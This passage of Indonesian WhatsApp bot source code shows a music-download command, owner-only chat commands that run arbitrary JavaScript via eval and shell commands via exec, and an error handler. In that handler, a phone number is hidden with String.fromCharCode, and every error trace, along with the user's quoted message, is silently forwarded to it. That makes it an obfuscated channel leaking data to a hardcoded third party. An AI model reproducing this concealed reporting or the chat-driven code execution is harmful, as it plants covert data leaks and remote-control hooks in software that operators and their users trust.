      contextInfo: {
        externalAdReply: {
          title: vid.title,
          body: `${vid.author.name} • ${vid.timestamp}`,
          thumbnailUrl: vid.thumbnail,
          sourceUrl: vid.url,
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }
    })

    try {
      fs.unlinkSync(inFile)
      fs.unlinkSync(outFile)
    } catch {}

    await react('✅')

    return m.reply(
`✅ *PLAYCH SUKSES*

🎵 Judul : ${vid.title}
👤 Artist : ${vid.author.name}
⏱ Durasi : ${vid.timestamp}
⚙️ Kualitas : ${quality} (${bitrate})

📢 Link Channel:
${channelInput}

🆔 ID Channel:
${channelId}`
    )

  } catch (e) {
    console.log(e)
    await Sky.sendMessage(m.chat, { react: { text: '❌', key: m.key }})
    return m.reply('❌ Gagal playch')
  }
}
break

//=======================[ Akhir Case ]===============================

default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//================================================================================

if (m.text.toLowerCase() == "bot") {
m.reply("Bot Online ✅")
}

//================================================================================
    
if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//================================================================================

if (budy.startsWith('$')) {
if (!isCreator) return
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}

//================================================================================
}
} catch (err) {
console.log(util.format(err));
let Obj = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
Sky.sendMessage(Obj + "@s.whatsapp.net", {text: `
*FITUR ERROR TERDETEKSI :*\n\n` + util.format(err), contextInfo: { isForwarded: true }}, {quoted: m})
}}

//================================================================================

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});

//=================================================================================
